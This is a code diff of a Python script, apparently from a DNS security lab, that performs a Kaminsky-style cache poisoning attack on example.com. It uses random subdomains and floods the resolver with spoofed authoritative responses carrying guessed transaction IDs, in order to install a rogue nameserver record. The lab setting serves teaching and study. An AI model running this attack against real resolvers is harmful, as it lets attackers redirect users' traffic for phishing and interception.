@@ -62,22 +62,22 @@ def exampleSendDNSQuery():
 def attack():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
     dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
-    #sendPacket(sock, dnsPacket, my_ip, my_port)
-    #response = sock.recv(4096)
-    #response = DNS(response)
+    sendPacket(sock, dnsPacket, my_ip, my_port)
+    response = sock.recv(4096)
+    response = DNS(response)
 
     # TODO: Fake the response and query
+    fake_query = dnsPacket
     fake_response = response
-    fake_response.aa = 1
-    fake_response.nscount = 1
     fake_response.ns.rrname = "example.com"
     fake_response.ns.rdata = "ns.dnslabattacker.net"
     fake_response.arcount = 0
     fake_response.ar = None
-    fake_query = dnsPacket
+    fake_response.aa = 1
+    fake_response.nscount = 1
 
     while True:
-        fake_name = getRandomSubDomain()
+        fake_name = getRandomSubDomain() 
         fake_query[DNS].qd.qname = fake_name + ".example.com"
         fake_response[DNS].qd.qname = fake_name + ".example.com"
         fake_response[DNS].an.rrname = fake_name + ".example.com"
@@ -85,6 +85,7 @@ def attack():
         # Fake query
         sendPacket(sock, fake_query, my_ip, my_port)
 
+        # Flood the server with fake responses
         for i in range(50):
             random_id = getRandomTXID()
             fake_response.id = random_id
@@ -96,13 +97,11 @@ def attack():
         response = sock.recv(4096)
         response = DNS(response)
         
-        if (response != None) & (response.nscount == 0):
-            pass
-        elif (response[DNS].ns[DNSRR].rdata == "ns.dnslabattacker.net"):
-            print("Cache poisoning succeeded\n")
+        if (response != None) & (response[DNS].ns[DNSRR].rdata == "ns.dnslabattacker.net."):
+            print("Cache poisoning succeeded!") 
             break
 
-        print("Cache poisoning failed. Try another around\n")
+        print("Cache poisoning failed. Trying another round...")
 
 if __name__ == '__main__':
     attack()
